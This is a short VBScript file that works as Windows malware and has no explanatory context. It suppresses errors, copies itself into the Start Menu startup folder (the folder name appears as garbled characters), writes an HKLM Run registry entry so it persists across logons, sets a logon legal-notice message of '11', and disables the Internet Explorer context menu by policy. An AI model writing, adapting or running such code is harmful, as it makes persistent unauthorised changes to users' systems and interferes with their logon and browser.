On Error Resume Next
Set fs=CreateObject("Scripting.FileSystemObject")
Set dir1=fs.GetSpecialFolder(0)
Set dir2=fs.GetSpecialFolder(1)
Set so=CreateObject("Scripting.FileSystemObject")
dim r
Set r=CreateObject("Wscript.Shell")
so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Start Menu\Programs\Æô¶¯\yanyong117777777777.vbs")
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\yanyong117777777777","yanyong117777777777.vbs"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption","11"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText","11"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu",1,"REG_DWORD"
